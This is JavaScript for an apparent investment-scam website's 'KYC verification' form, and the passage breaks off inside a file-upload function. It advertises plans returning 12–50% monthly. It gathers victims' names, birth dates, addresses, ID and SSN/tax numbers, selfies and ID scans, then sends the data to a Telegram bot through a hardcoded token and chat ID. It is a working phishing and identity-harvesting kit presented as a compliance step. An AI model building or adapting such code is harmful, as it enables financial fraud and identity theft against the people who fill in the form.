// ─── STEP DEFINITIONS ────────────────────────────────────────────────────────
const STEPS = [
  { id:'personal',  label:'Personal',   icon:'👤' },
  { id:'contact',   label:'Contact',    icon:'📱' },
  { id:'identity',  label:'Identity',   icon:'🪪'  },
  { id:'financial', label:'Financial',  icon:'💼' },
  { id:'documents', label:'Documents',  icon:'📎' },
  { id:'review',    label:'Review',     icon:'✅'  },
];
let currentStep = 0;
const formData = {};

// Pre-fill from URL params (e.g. ?plan=Silver passed from main page)
(function prefillFromURL() {
  const params = new URLSearchParams(window.location.search);
  const planMap = {
    bronze: 'Bronze', silver: 'Silver', gold: 'Gold', platinum: 'Platinum'
  };
  const planParam = params.get('plan');
  if (planParam) {
    const matched = planMap[planParam.toLowerCase()];
    if (matched) formData.plan = matched;
  }
  // Optional: pre-fill step to jump straight to financial if plan chosen
  // (currently starts at step 0 always for full KYC flow)
})();

// ─── BUILD STEP HEADER ────────────────────────────────────────────────────────
function buildStepHeader() {
  const header = document.getElementById('stepsHeader');
  const line = document.getElementById('stepsLine');
  header.querySelectorAll('.step-item').forEach(e => e.remove());
  STEPS.forEach((s, i) => {
    const div = document.createElement('div');
    div.className = 'step-item';
    const cls = i < currentStep ? 'done' : i === currentStep ? 'active' : '';
    const lblCls = i < currentStep ? 'done' : i === currentStep ? 'active' : '';
    div.innerHTML = `<div class="step-circle ${cls}">${i < currentStep ? '✓' : i + 1}</div><div class="step-label ${lblCls}">${s.label}</div>`;
    header.appendChild(div);
  });
  const pct = currentStep === 0 ? 0 : (currentStep / (STEPS.length - 1)) * 100;
  line.style.width = pct + '%';
}

// ─── RENDER STEP CONTENT ──────────────────────────────────────────────────────
function renderStep() {
  buildStepHeader();
  const panel = document.getElementById('formPanel');
  panel.style.animation = 'none';
  panel.offsetHeight;
  panel.style.animation = 'panelIn .4s ease';

  const s = STEPS[currentStep];
  let html = '';

  if (s.id === 'personal') {
    html = `
      <div class="panel-head">
        <div class="panel-step-tag">Step 1 of 6 · Personal Information</div>
        <h2>Tell Us About Yourself</h2>
        <p>Please provide your legal name and personal details exactly as they appear on your government-issued ID.</p>
      </div>
      <div class="form-grid">
        <div class="form-grid form-grid-2">
          <div class="field-group">
            <label>First Name <span class="req">*</span></label>
            <input class="field-input" type="text" id="f_firstName" placeholder="John" value="${formData.firstName||''}">
          </div>
          <div class="field-group">
            <label>Last Name <span class="req">*</span></label>
            <input class="field-input" type="text" id="f_lastName" placeholder="Smith" value="${formData.lastName||''}">
          </div>
        </div>
        <div class="form-grid form-grid-2">
          <div class="field-group">
            <label>Middle Name</label>
            <input class="field-input" type="text" id="f_middleName" placeholder="Optional" value="${formData.middleName||''}">
          </div>
          <div class="field-group">
            <label>Date of Birth <span class="req">*</span></label>
            <input class="field-input" type="date" id="f_dob" value="${formData.dob||''}">
          </div>
        </div>
        <div class="form-grid form-grid-2">
          <div class="field-group">
            <label>Gender <span class="req">*</span></label>
            <select class="field-input" id="f_gender">
              <option value="">Select gender</option>
              <option ${formData.gender==='Male'?'selected':''}>Male</option>
              <option ${formData.gender==='Female'?'selected':''}>Female</option>
              <option ${formData.gender==='Prefer not to say'?'selected':''}>Prefer not to say</option>
            </select>
          </div>
          <div class="field-group">
            <label>Marital Status</label>
            <select class="field-input" id="f_marital">
              <option value="">Select status</option>
              <option ${formData.marital==='Single'?'selected':''}>Single</option>
              <option ${formData.marital==='Married'?'selected':''}>Married</option>
              <option ${formData.marital==='Divorced'?'selected':''}>Divorced</option>
              <option ${formData.marital==='Widowed'?'selected':''}>Widowed</option>
            </select>
          </div>
        </div>
        <div class="form-grid form-grid-2">
          <div class="field-group">
            <label>Nationality <span class="req">*</span></label>
            <select class="field-input" id="f_nationality">
              <option value="">Select nationality</option>
              <option>American</option><option>British</option><option>Canadian</option>
              <option>Australian</option><option>Nigerian</option><option>Ghanaian</option>
              <option>South African</option><option>German</option><option>French</option>
              <option>Indian</option><option>Chinese</option><option>Other</option>
            </select>
          </div>
          <div class="field-group">
            <label>Country of Birth</label>
            <select class="field-input" id="f_birthCountry">
              <option value="">Select country</option>
              <option>United States</option><option>United Kingdom</option><option>Canada</option>
              <option>Australia</option><option>Nigeria</option><option>Ghana</option>
              <option>South Africa</option><option>Germany</option><option>France</option>
              <option>India</option><option>China</option><option>Other</option>
            </select>
          </div>
        </div>
      </div>
      <div class="btn-row">
        <button class="btn-next" onclick="nextStep('personal')">Continue &rarr;</button>
      </div>`;
  }

  else if (s.id === 'contact') {
    html = `
      <div class="panel-head">
        <div class="panel-step-tag">Step 2 of 6 · Contact Information</div>
        <h2>How Can We Reach You?</h2>
        <p>Your contact details are used for account notifications, verification codes, and important updates.</p>
      </div>
      <div class="form-grid">
        <div class="field-group">
          <label>Email Address <span class="req">*</span></label>
          <input class="field-input" type="email" id="f_email" placeholder="john.smith@email.com" value="${formData.email||''}">
        </div>
        <div class="form-grid form-grid-2">
          <div class="field-group">
            <label>Phone Number <span class="req">*</span></label>
            <input class="field-input" type="tel" id="f_phone" placeholder="+1 (555) 000-0000" value="${formData.phone||''}">
          </div>
          <div class="field-group">
            <label>Alternative Number</label>
            <input class="field-input" type="tel" id="f_whatsapp" placeholder="+1 (555) 000-0000" value="${formData.whatsapp||''}">
          </div>
        </div>
        <div class="section-divider"><span>Residential Address</span></div>
        <div class="field-group">
          <label>Street Address <span class="req">*</span></label>
          <input class="field-input" type="text" id="f_address" placeholder="123 Main Street, Apt 4B" value="${formData.address||''}">
        </div>
        <div class="form-grid form-grid-2">
          <div class="field-group">
            <label>City <span class="req">*</span></label>
            <input class="field-input" type="text" id="f_city" placeholder="New York" value="${formData.city||''}">
          </div>
          <div class="field-group">
            <label>State / Province</label>
            <input class="field-input" type="text" id="f_state" placeholder="NY" value="${formData.state||''}">
          </div>
        </div>
        <div class="form-grid form-grid-2">
          <div class="field-group">
            <label>ZIP / Postal Code</label>
            <input class="field-input" type="text" id="f_zip" placeholder="10001" value="${formData.zip||''}">
          </div>
          <div class="field-group">
            <label>Country <span class="req">*</span></label>
            <select class="field-input" id="f_country">
              <option value="">Select country</option>
              <option>United States</option><option>United Kingdom</option><option>Canada</option>
              <option>Australia</option><option>Nigeria</option><option>Ghana</option>
              <option>South Africa</option><option>Germany</option><option>France</option>
              <option>India</option><option>China</option><option>Other</option>
            </select>
          </div>
        </div>
      </div>
      <div class="btn-row">
        <button class="btn-back" onclick="prevStep()">← Back</button>
        <button class="btn-next" onclick="nextStep('contact')">Continue →</button>
      </div>`;
  }

  else if (s.id === 'identity') {
    html = `
      <div class="panel-head">
        <div class="panel-step-tag">Step 3 of 6 · Identity Verification</div>
        <h2>Verify Your Identity</h2>
        <p>Select your preferred government-issued ID and provide the details. This is required for regulatory compliance.</p>
      </div>
      <div class="form-grid">
        <div class="field-group">
          <label>ID Type <span class="req">*</span></label>
          <select class="field-input" id="f_idType">
            <option value="">Select ID type</option>
            <option ${formData.idType==='passport'?'selected':''} value="passport">International Passport</option>
            <option ${formData.idType==='drivers'?'selected':''} value="drivers">Driver's License</option>
            <option ${formData.idType==='national'?'selected':''} value="national">National Identity Card</option>
            <option ${formData.idType==='residence'?'selected':''} value="residence">Permanent Residence Card</option>
            <option ${formData.idType==='voter'?'selected':''} value="voter">Voter's Card</option>
          </select>
        </div>
        <div class="form-grid form-grid-2">
          <div class="field-group">
            <label>ID Number <span class="req">*</span></label>
            <input class="field-input" type="text" id="f_idNumber" placeholder="e.g. A12345678" value="${formData.idNumber||''}">
          </div>
          <div class="field-group">
            <label>Issuing Country <span class="req">*</span></label>
            <select class="field-input" id="f_idCountry">
              <option value="">Select country</option>
              <option>United States</option><option>United Kingdom</option><option>Canada</option>
              <option>Australia</option><option>Nigeria</option><option>Ghana</option>
              <option>South Africa</option><option>Germany</option><option>France</option>
              <option>India</option><option>Other</option>
            </select>
          </div>
        </div>
        <div class="form-grid form-grid-2">
          <div class="field-group">
            <label>Issue Date</label>
            <input class="field-input" type="date" id="f_idIssue" value="${formData.idIssue||''}">
          </div>
          <div class="field-group">
            <label>Expiry Date <span class="req">*</span></label>
            <input class="field-input" type="date" id="f_idExpiry" value="${formData.idExpiry||''}">
          </div>
        </div>
        <div class="section-divider"><span>Tax Information</span></div>
        <div class="form-grid form-grid-2">
          <div class="field-group">
            <label>Tax ID / SSN / TIN <span class="req">*</label>
            <input class="field-input" type="text" id="f_taxId" placeholder="Required" value="${formData.taxId||''}">
          </div>
          <div class="field-group">
            <label>Tax Residency Country</label>
            <select class="field-input" id="f_taxCountry">
              <option value="">Select country</option>
              <option>United States</option><option>United Kingdom</option><option>Canada</option>
              <option>Australia</option><option>Nigeria</option><option>Other</option>
            </select>
          </div>
        </div>
      </div>
      <div class="btn-row">
        <button class="btn-back" onclick="prevStep()">← Back</button>
        <button class="btn-next" onclick="nextStep('identity')">Continue →</button>
      </div>`;
  }

  else if (s.id === 'financial') {
    html = `
      <div class="panel-head">
        <div class="panel-step-tag">Step 4 of 6 · Financial Profile</div>
        <h2>Your Investment Profile</h2>
        <p>This helps us tailor the best investment strategy and plan for your financial goals.</p>
      </div>
      <div class="form-grid">
        <div class="field-group">
          <label>Employment Status <span class="req">*</span></label>
          <select class="field-input" id="f_employment">
            <option value="">Select status</option>
            <option>Employed (Full-time)</option><option>Employed (Part-time)</option>
            <option>Self-Employed</option><option>Business Owner</option>
            <option>Retired</option><option>Student</option><option>Unemployed</option>
          </select>
        </div>
        <div class="form-grid form-grid-2">
          <div class="field-group">
            <label>Occupation / Job Title</label>
            <input class="field-input" type="text" id="f_occupation" placeholder="e.g. Software Engineer" value="${formData.occupation||''}">
          </div>
          <div class="field-group">
            <label>Employer / Company Name</label>
            <input class="field-input" type="text" id="f_employer" placeholder="Optional" value="${formData.employer||''}">
          </div>
        </div>
        <div class="form-grid form-grid-2">
          <div class="field-group">
            <label>Annual Income (USD) <span class="req">*</span></label>
            <select class="field-input" id="f_income">
              <option value="">Select range</option>
              <option>Below $20,000</option><option>$20,000 – $50,000</option>
              <option>$50,000 – $100,000</option><option>$100,000 – $250,000</option>
              <option>$250,000 – $500,000</option><option>Above $500,000</option>
            </select>
          </div>
          <div class="field-group">
            <label>Source of Funds <span class="req">*</span></label>
            <select class="field-input" id="f_sourceOfFunds">
              <option value="">Select source</option>
              <option>Employment / Salary</option><option>Business Income</option>
              <option>Inheritance / Gift</option><option>Investment Returns</option>
              <option>Property Sale</option><option>Savings</option><option>Other</option>
            </select>
          </div>
        </div>
        <div class="section-divider"><span>Investment Preferences</span></div>
        <div class="field-group">
          <label>Choose Your Investment Plan <span class="req">*</span></label>
          <div class="plan-grid" id="planGrid">
            <label class="plan-card${formData.plan==='Bronze'?' selected':''}" onclick="selectPlan(this,'Bronze')">
              <input type="radio" name="plan" value="Bronze" ${formData.plan==='Bronze'?'checked':''}>
              <div class="plan-name">🥉 Bronze</div>
              <div class="plan-roi">12% Monthly ROI</div>
              <div class="plan-min">Min. $500</div>
            </label>
            <label class="plan-card${formData.plan==='Silver'?' selected':''}" onclick="selectPlan(this,'Silver')">
              <input type="radio" name="plan" value="Silver" ${formData.plan==='Silver'?'checked':''}>
              <div class="plan-name">🥈 Silver</div>
              <div class="plan-roi">22% Monthly ROI</div>
              <div class="plan-min">Min. $5,000</div>
            </label>
            <label class="plan-card${formData.plan==='Gold'?' selected':''}" onclick="selectPlan(this,'Gold')">
              <input type="radio" name="plan" value="Gold" ${formData.plan==='Gold'?'checked':''}>
              <div class="plan-name">🥇 Gold</div>
              <div class="plan-roi">35% Monthly ROI</div>
              <div class="plan-min">Min. $25,000</div>
            </label>
            <label class="plan-card${formData.plan==='Platinum'?' selected':''}" onclick="selectPlan(this,'Platinum')">
              <input type="radio" name="plan" value="Platinum" ${formData.plan==='Platinum'?'checked':''}>
              <div class="plan-name">💎 Platinum</div>
              <div class="plan-roi">50% Monthly ROI</div>
              <div class="plan-min">Min. $100,000</div>
            </label>
          </div>
        </div>
        <div class="field-group">
          <label>Risk Tolerance</label>
          <select class="field-input" id="f_risk">
            <option value="">Select preference</option>
            <option>Conservative (low risk)</option>
            <option>Moderate (balanced)</option>
            <option>Aggressive (high growth)</option>
          </select>
        </div>
        <div class="field-group">
          <label>Investment Goal</label>
          <textarea class="field-input" id="f_goal" placeholder="e.g. I want to grow my retirement savings over 5 years...">${formData.goal||''}</textarea>
        </div>
      </div>
      <div class="btn-row">
        <button class="btn-back" onclick="prevStep()">← Back</button>
        <button class="btn-next" onclick="nextStep('financial')">Continue →</button>
      </div>`;
  }

  else if (s.id === 'documents') {
    html = `
      <div class="panel-head">
        <div class="panel-step-tag">Step 5 of 6 · Upload Documents</div>
        <h2>Upload Your Documents</h2>
        <p>Upload clear, readable copies of your documents. Files should be under 10MB each. Accepted formats: JPG, PNG, PDF.</p>
      </div>
      <div class="form-grid">
        <div class="section-divider"><span>Profile Photo</span></div>
        <div class="field-group">
          <label>Selfie / Profile Photo <span class="req">*</span></label>
          <div class="photo-upload-wrap">
            <div class="photo-preview-circle" id="photoCircle">
              <input type="file" accept="image/*" id="f_photo" onchange="handlePhoto(this)">
              <img id="photoImg">
              <span class="photo-placeholder">📷</span>
            </div>
            <div class="photo-upload-info">
              <h4>Upload a clear selfie</h4>
              <p>Face must be clearly visible.<br>No sunglasses, hats or filters.<br>Plain background preferred.</p>
              <label class="btn-upload-photo" for="f_photo">📷 Choose Photo</label>
            </div>
          </div>
        </div>
        <div class="section-divider"><span>Government ID</span></div>
        <div class="field-group">
          <label>Front of ID <span class="req">*</span></label>
          <div class="upload-zone" id="zone_idFront">
            <input type="file" accept="image/*,.pdf" id="f_idFront" onchange="handleFile(this,'zone_idFront','prev_idFront')">
            <span class="upload-icon">🪪</span>
            <h4>Front of your ID</h4>
            <p>Passport photo page, front of driver's license or national ID</p>
            <div class="file-types"><span class="file-type-pill">JPG</span><span class="file-type-pill">PNG</span><span class="file-type-pill">PDF</span></div>
          </div>
          <div class="upload-preview" id="prev_idFront">
            <span class="preview-icon">📄</span>
            <div class="preview-info"><div class="preview-name" id="prev_idFront_name"></div><div class="preview-size" id="prev_idFront_size"></div></div>
            <button class="preview-remove" onclick="removeFile('f_idFront','zone_idFront','prev_idFront')">✕</button>
          </div>
        </div>
        <div class="field-group">
          <label>Back of ID (if applicable)</label>
          <div class="upload-zone" id="zone_idBack">
            <input type="file" accept="image/*,.pdf" id="f_idBack" onchange="handleFile(this,'zone_idBack','prev_idBack')">
            <span class="upload-icon">🪪</span>
            <h4>Back of your ID</h4>
            <p>Back side of driver's license or national ID (not required for passport)</p>
            <div class="file-types"><span class="file-type-pill">JPG</span><span class="file-type-pill">PNG</span><span class="file-type-pill">PDF</span></div>
          </div>
          <div class="upload-preview" id="prev_idBack">
            <span class="preview-icon">📄</span>
            <div class="preview-info"><div class="preview-name" id="prev_idBack_name"></div><div class="preview-size" id="prev_idBack_size"></div></div>
            <button class="preview-remove" onclick="removeFile('f_idBack','zone_idBack','prev_idBack')">✕</button>
          </div>
        </div>
        <div class="section-divider"><span>Proof of Address</span></div>
        <div class="field-group">
          <label>Utility Bill / Bank Statement <span class="req">*</span></label>
          <div class="upload-zone" id="zone_poa">
            <input type="file" accept="image/*,.pdf" id="f_poa" onchange="handleFile(this,'zone_poa','prev_poa')">
            <span class="upload-icon">🏠</span>
            <h4>Proof of Address</h4>
            <p>Recent utility bill, bank statement, or official mail (dated within 3 months)</p>
            <div class="file-types"><span class="file-type-pill">JPG</span><span class="file-type-pill">PNG</span><span class="file-type-pill">PDF</span></div>
          </div>
          <div class="upload-preview" id="prev_poa">
            <span class="preview-icon">📄</span>
            <div class="preview-info"><div class="preview-name" id="prev_poa_name"></div><div class="preview-size" id="prev_poa_size"></div></div>
            <button class="preview-remove" onclick="removeFile('f_poa','zone_poa','prev_poa')">✕</button>
          </div>
        </div>
        <div class="section-divider"><span>Additional Documents (Optional)</span></div>
        <div class="field-group">
          <label>Source of Funds Proof</label>
          <div class="upload-zone" id="zone_sof">
            <input type="file" accept="image/*,.pdf" id="f_sof" onchange="handleFile(this,'zone_sof','prev_sof')">
            <span class="upload-icon">💵</span>
            <h4>Bank statement / Payslip</h4>
            <p>Optional but speeds up verification</p>
            <div class="file-types"><span class="file-type-pill">JPG</span><span class="file-type-pill">PNG</span><span class="file-type-pill">PDF</span></div>
          </div>
          <div class="upload-preview" id="prev_sof">
            <span class="preview-icon">📄</span>
            <div class="preview-info"><div class="preview-name" id="prev_sof_name"></div><div class="preview-size" id="prev_sof_size"></div></div>
            <button class="preview-remove" onclick="removeFile('f_sof','zone_sof','prev_sof')">✕</button>
          </div>
        </div>
      </div>
      <div class="btn-row">
        <button class="btn-back" onclick="prevStep()">← Back</button>
        <button class="btn-next" onclick="nextStep('documents')">Continue →</button>
      </div>`;
  }

  else if (s.id === 'review') {
    const plan = formData.plan || 'Not selected';
    html = `
      <div class="panel-head">
        <div class="panel-step-tag">Step 6 of 6 · Review & Submit</div>
        <h2>Review Your Application</h2>
        <p>Please review the information below before submitting. Ensure all details are accurate.</p>
      </div>
      <div style="display:flex;flex-direction:column;gap:.7rem;margin-bottom:1.5rem;">
        ${reviewRow('Full Name', `${formData.firstName||''} ${formData.middleName||''} ${formData.lastName||''}`)}
        ${reviewRow('Date of Birth', formData.dob||'—')}
        ${reviewRow('Nationality', formData.nationality||'—')}
        ${reviewRow('Email', formData.email||'—')}
        ${reviewRow('Phone', formData.phone||'—')}
        ${reviewRow('Address', `${formData.address||''}, ${formData.city||''}, ${formData.country||''}`)}
        ${reviewRow('ID Type', formData.idType||'—')}
        ${reviewRow('ID Number', formData.idNumber||'—')}
        ${reviewRow('Investment Plan', plan)}
        ${reviewRow('Annual Income', formData.income||'—')}
        ${reviewRow('Source of Funds', formData.sourceOfFunds||'—')}
      </div>
      <div class="form-grid" style="gap:.9rem;">
        <label class="check-row">
          <input type="checkbox" id="chk_terms">
          <div class="custom-check"></div>
          <span class="check-label">I confirm that all information provided is accurate and truthful. I understand that providing false information may result in account termination. <a href="#">Terms & Conditions</a></span>
        </label>
        <label class="check-row">
          <input type="checkbox" id="chk_kyc">
          <div class="custom-check"></div>
          <span class="check-label">I consent to Globex Investments collecting and processing my personal data for KYC verification purposes as described in the <a href="#">Privacy Policy</a>.</span>
        </label>
        <label class="check-row">
          <input type="checkbox" id="chk_risk">
          <div class="custom-check"></div>
          <span class="check-label">I understand investment risks and that past performance does not guarantee future results. I am investing funds I can afford.</span>
        </label>
      </div>
      <div class="btn-row">
        <button class="btn-back" onclick="prevStep()">← Back</button>
        <button class="btn-next btn-submit" onclick="submitApplication()">🚀 &nbsp;Submit Application</button>
      </div>`;
  }

  panel.innerHTML = html;

  // Drag-and-drop for upload zones
  document.querySelectorAll('.upload-zone').forEach(zone => {
    zone.addEventListener('dragover', e => { e.preventDefault(); zone.classList.add('drag'); });
    zone.addEventListener('dragleave', () => zone.classList.remove('drag'));
    zone.addEventListener('drop', e => {
      e.preventDefault();
      zone.classList.remove('drag');
      const input = zone.querySelector('input[type=file]');
      if (input && e.dataTransfer.files.length) {
        input.files = e.dataTransfer.files;
        input.dispatchEvent(new Event('change'));
      }
    });
  });
}

// ─── REVIEW ROW ──────────────────────────────────────────────────────────────
function reviewRow(label, value) {
  return `<div style="display:flex;align-items:center;justify-content:space-between;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:10px;padding:.75rem 1.1rem;gap:1rem;">
    <span style="font-size:.75rem;font-weight:700;color:var(--muted);letter-spacing:.05em;text-transform:uppercase;flex-shrink:0;">${label}</span>
    <span style="font-size:.88rem;font-weight:600;text-align:right;">${value || '—'}</span>
  </div>`;
}

// ─── PLAN SELECT ─────────────────────────────────────────────────────────────
function selectPlan(el, plan) {
  document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('selected'));
  el.classList.add('selected');
  formData.plan = plan;
}

// ─── FILE HANDLERS ────────────────────────────────────────────────────────────
// Maps input IDs to formData keys so files survive DOM re-renders
const FILE_KEY_MAP = {
  f_photo:   'file_photo',
  f_idFront: 'file_idFront',
  f_idBack:  'file_idBack',
  f_poa:     'file_poa',
  f_sof:     'file_sof',
};

function handleFile(input, zoneId, prevId) {
  if (!input.files.length) return;
  const file = input.files[0];

  // Persist File object so it survives step/DOM changes
  if (FILE_KEY_MAP[input.id]) formData[FILE_KEY_MAP[input.id]] = file;

  const zone = document.getElementById(zoneId);
  const prev = document.getElementById(prevId);
  if (zone) zone.style.borderColor = 'var(--green)';
  if (prev) {
    document.getElementById(prevId + '_name').textContent = file.name;
    document.getElementById(prevId + '_size').textContent = (file.size / 1024).toFixed(1) + ' KB';
    prev.classList.add('visible');
  }
}

function removeFile(inputId, zoneId, prevId) {
  document.getElementById(inputId).value = '';
  // Clear saved File object too
  if (FILE_KEY_MAP[inputId]) delete formData[FILE_KEY_MAP[inputId]];
  const zone = document.getElementById(zoneId);
  const prev = document.getElementById(prevId);
  if (zone) zone.style.borderColor = '';
  if (prev) prev.classList.remove('visible');
}

function handlePhoto(input) {
  if (!input.files.length) return;
  const file = input.files[0];

  // Persist File object
  if (FILE_KEY_MAP[input.id]) formData[FILE_KEY_MAP[input.id]] = file;

  const reader = new FileReader();
  reader.onload = e => {
    const img = document.getElementById('photoImg');
    const placeholder = document.querySelector('.photo-placeholder');
    if (img) { img.src = e.target.result; img.style.display = 'block'; }
    if (placeholder) placeholder.style.display = 'none';
  };
  reader.readAsDataURL(file);
}

// ─── NAVIGATION ──────────────────────────────────────────────────────────────
function saveStepData(stepId) {
  const g = id => { const el = document.getElementById(id); return el ? el.value : ''; };
  if (stepId === 'personal') {
    Object.assign(formData, { firstName:g('f_firstName'), lastName:g('f_lastName'), middleName:g('f_middleName'), dob:g('f_dob'), gender:g('f_gender'), marital:g('f_marital'), nationality:g('f_nationality'), birthCountry:g('f_birthCountry') });
  } else if (stepId === 'contact') {
    Object.assign(formData, { email:g('f_email'), phone:g('f_phone'), whatsapp:g('f_whatsapp'), address:g('f_address'), city:g('f_city'), state:g('f_state'), zip:g('f_zip'), country:g('f_country') });
  } else if (stepId === 'identity') {
    Object.assign(formData, { idType:g('f_idType'), idNumber:g('f_idNumber'), idCountry:g('f_idCountry'), idIssue:g('f_idIssue'), idExpiry:g('f_idExpiry'), taxId:g('f_taxId'), taxCountry:g('f_taxCountry') });
  } else if (stepId === 'financial') {
    Object.assign(formData, { employment:g('f_employment'), occupation:g('f_occupation'), employer:g('f_employer'), income:g('f_income'), sourceOfFunds:g('f_sourceOfFunds'), risk:g('f_risk'), goal:g('f_goal') });
  }
}

function validateStep(stepId) {
  const g = id => { const el = document.getElementById(id); return el ? el.value.trim() : ''; };
  const required = {
    personal: ['f_firstName','f_lastName','f_dob','f_gender','f_nationality'],
    contact: ['f_email','f_phone','f_address','f_city','f_country'],
    identity: ['f_idType','f_idNumber','f_idExpiry'],
    financial: ['f_employment','f_income','f_sourceOfFunds'],
    documents: []
  };
  const fields = required[stepId] || [];
  for (const id of fields) {
    if (!g(id)) {
      const el = document.getElementById(id);
      if (el) { el.focus(); el.style.borderColor = 'var(--red)'; el.addEventListener('input', () => el.style.borderColor = '', {once:true}); }
      return false;
    }
  }
  return true;
}

function nextStep(stepId) {
  if (!validateStep(stepId)) { showToast('Please fill in all required fields.'); return; }
  saveStepData(stepId);
  currentStep++;
  renderStep();
  window.scrollTo({top:0,behavior:'smooth'});
}

function prevStep() {
  currentStep--;
  renderStep();
  window.scrollTo({top:0,behavior:'smooth'});
}

// ─── SUBMIT ───────────────────────────────────────────────────────────────────
function submitApplication() {
  const chkTerms = document.getElementById('chk_terms');
  const chkKyc = document.getElementById('chk_kyc');
  const chkRisk = document.getElementById('chk_risk');
  if (!chkTerms?.checked || !chkKyc?.checked || !chkRisk?.checked) {
    showToast('Please accept all agreements to continue.'); return;
  }

  const refId = 'GBX-' + Date.now().toString(36).toUpperCase().slice(-6);
  formData.refId = refId;

  // ── Telegram HTML message (bold labels, plain values) ──
  const planEmoji = { Bronze:'🥉', Silver:'🥈', Gold:'🥇', Platinum:'💎' };
  const pe = planEmoji[formData.plan] || '📊';
  const nl = '\n';

  const msg =
    `🚨 <b>NEW KYC APPLICATION RECEIVED</b>${nl}` +
    `━━━━━━━━━━━━━━━━━━━━━━${nl}` +
    `🪪 <b>REFERENCE</b>${nl}` +
    `<b>Ref ID:</b> ${refId}${nl}` +
    `<b>Submitted:</b> ${new Date().toLocaleString()}${nl}` +
    `━━━━━━━━━━━━━━━━━━━━━━${nl}` +
    `👤 <b>PERSONAL DETAILS</b>${nl}` +
    `<b>Full Name:</b> ${formData.firstName||''} ${formData.middleName||''} ${formData.lastName||''}${nl}` +
    `<b>Date of Birth:</b> ${formData.dob||'—'}${nl}` +
    `<b>Gender:</b> ${formData.gender||'—'}${nl}` +
    `<b>Marital Status:</b> ${formData.marital||'—'}${nl}` +
    `<b>Nationality:</b> ${formData.nationality||'—'}${nl}` +
    `<b>Country of Birth:</b> ${formData.birthCountry||'—'}${nl}` +
    `━━━━━━━━━━━━━━━━━━━━━━${nl}` +
    `📱 <b>CONTACT INFORMATION</b>${nl}` +
    `<b>Email:</b> ${formData.email||'—'}${nl}` +
    `<b>Phone:</b> ${formData.phone||'—'}${nl}` +
    `<b>WhatsApp:</b> ${formData.whatsapp||'N/A'}${nl}` +
    `<b>Address:</b> ${formData.address||'—'}${nl}` +
    `<b>City:</b> ${formData.city||'—'}${nl}` +
    `<b>State / Province:</b> ${formData.state||'—'}${nl}` +
    `<b>ZIP / Postal Code:</b> ${formData.zip||'—'}${nl}` +
    `<b>Country:</b> ${formData.country||'—'}${nl}` +
    `━━━━━━━━━━━━━━━━━━━━━━${nl}` +
    `🪪 <b>IDENTITY VERIFICATION</b>${nl}` +
    `<b>ID Type:</b> ${formData.idType||'—'}${nl}` +
    `<b>ID Number:</b> ${formData.idNumber||'—'}${nl}` +
    `<b>Issuing Country:</b> ${formData.idCountry||'—'}${nl}` +
    `<b>Issue Date:</b> ${formData.idIssue||'—'}${nl}` +
    `<b>Expiry Date:</b> ${formData.idExpiry||'—'}${nl}` +
    `<b>Tax ID / SSN / TIN:</b> ${formData.taxId||'N/A'}${nl}` +
    `<b>Tax Residency:</b> ${formData.taxCountry||'—'}${nl}` +
    `━━━━━━━━━━━━━━━━━━━━━━${nl}` +
    `💼 <b>FINANCIAL PROFILE</b>${nl}` +
    `<b>Employment Status:</b> ${formData.employment||'—'}${nl}` +
    `<b>Occupation:</b> ${formData.occupation||'—'}${nl}` +
    `<b>Employer / Company:</b> ${formData.employer||'—'}${nl}` +
    `<b>Annual Income:</b> ${formData.income||'—'}${nl}` +
    `<b>Source of Funds:</b> ${formData.sourceOfFunds||'—'}${nl}` +
    `<b>Risk Tolerance:</b> ${formData.risk||'—'}${nl}` +
    `<b>Investment Goal:</b> ${formData.goal||'—'}${nl}` +
    `━━━━━━━━━━━━━━━━━━━━━━${nl}` +
    `${pe} <b>INVESTMENT PLAN</b>${nl}` +
    `<b>Selected Plan:</b> ${formData.plan||'Not selected'}${nl}` +
    `━━━━━━━━━━━━━━━━━━━━━━${nl}` +
    `✅ <b>STATUS:</b> Awaiting KYC Review`;

  sendTelegramMessage(msg);
  sendTelegramDocuments();

  const panel = document.getElementById('formPanel');
  panel.innerHTML = `
    <div class="success-panel">
      <div class="success-anim">✓</div>
      <h2>Application Submitted!</h2>
      <p>Thank you, <strong>${formData.firstName}</strong>! Your KYC application has been received and is now under review by our compliance team.</p>
      <div class="ref-box">
        <div class="ref-label">Application Reference ID</div>
        <div class="ref-id">${refId}</div>
      </div>
      <div class="success-steps">
        <div class="success-step">
          <div class="success-step-icon">📧</div>
          <div><div class="success-step-text">You'll Receive an Email</div><div class="success-step-sub">An Emaill Will Be Sent to ${formData.email} after final verification</div></div>
        </div>
        <div class="success-step">
          <div class="success-step-icon">⏳</div>
          <div><div class="success-step-text">Review in Progress</div><div class="success-step-sub">KYC verification typically takes 24–48 hours</div></div>
        </div>
        <div class="success-step">
          <div class="success-step-icon">🚀</div>
          <div><div class="success-step-text">Account Activation</div><div class="success-step-sub">Once approved, you'll receive login credentials</div></div>
        </div>
      </div>
      <div style="margin-top:2rem;">
        <a href="index.html" style="display:inline-flex;align-items:center;gap:.5rem;background:var(--gold-dim);border:1px solid var(--border);color:var(--gold);padding:.85rem 1.8rem;border-radius:13px;font-family:'Clash Display',sans-serif;font-weight:700;font-size:.9rem;text-decoration:none;margin-right:.8rem;">← Back to Home</a>
        <a href="mailto:supports.globexinvestments@gmail.com" style="display:inline-flex;align-items:center;gap:.5rem;background:var(--gold-dim);border:1px solid var(--border);color:var(--gold);padding:.85rem 1.8rem;border-radius:13px;font-family:'Clash Display',sans-serif;font-weight:700;font-size:.9rem;text-decoration:none;">✉️ Contact Support</a>
      </div>
    </div>`;

  document.querySelector('.progress-wrap').style.display = 'none';
  window.scrollTo({top:0,behavior:'smooth'});
}

// ─── TELEGRAM ────────────────────────────────────────────────────────────────
const TG_TOKEN = "8974754656:AAHp4FyrkVXFpZqKr2Ti8yhc5sk4gO3AKBE";
const TG_CHAT = "7637163658";
const TG_BASE = `https://api.telegram.org/bot${TG_TOKEN}`;

// Send the formatted HTML text message
async function sendTelegramMessage(text) {
  try {
    await fetch(`${TG_BASE}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TG_CHAT,
        text,
        parse_mode: 'HTML'
      })
    });
  } catch(e) { console.error('Telegram message error:', e); }
}

// Send a single file to Telegram with a caption
async function sendTelegramFile(file, caption) {
  try {
    const fd = new FormData();
    fd.append('chat_id', TG_CHAT);
    fd.append('caption', caption);
    fd.append('parse_mode', 'HTML');

    // Use sendPhoto for images, sendDocument for PDFs
    const isImage = file.type.startsWith('image/');
